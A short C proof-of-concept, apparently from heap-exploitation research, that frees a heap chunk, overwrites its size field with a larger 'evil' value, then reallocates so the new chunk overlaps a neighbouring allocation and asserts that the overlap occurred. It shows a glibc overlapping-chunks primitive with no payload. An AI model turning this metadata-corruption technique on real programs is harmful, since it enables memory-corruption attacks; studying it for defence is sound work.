#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>
#include <string.h>
#include <unistd.h>
int main() {
    setbuf(stdout, NULL);
setbuf(stdin, NULL);
//start 
intptr_t *malloc_overwrite_object = malloc( 1); 
intptr_t *malloc_victim_object = malloc( 121); 
intptr_t *malloc_overlapped_object = malloc( 1);
free(malloc_victim_object);
int evil_chunk_size =161;
*(malloc_victim_object-1) = evil_chunk_size;
intptr_t *malloc_final_object = malloc( 152); 
//end
printf("malloc_vicitm_object %p \n",malloc_victim_object);
printf(" malloc_final_object= %p \n", (char *)malloc_final_object);
printf("malloc_overlapped_object= %p\n", (char *)malloc_overlapped_object);
memset(malloc_victim_object, '4', evil_chunk_size-1-8);
fprintf(stderr, "malloc_final_object = %s\n", (char *)malloc_final_object);
fprintf(stderr, "malloc_overlapped_object = %s\n", (char *)malloc_overlapped_object);
memset(malloc_overlapped_object, '3', 8);
fprintf(stderr, "malloc_final_object = %s\n", (char *)malloc_final_object);
fprintf(stderr, "malloc_overlapped_object = %s\n", (char *)malloc_overlapped_object);
char *found = memchr(malloc_victim_object, '3', evil_chunk_size-1-8);
assert(found != NULL );
printf("%s", "exp state arrive!");
}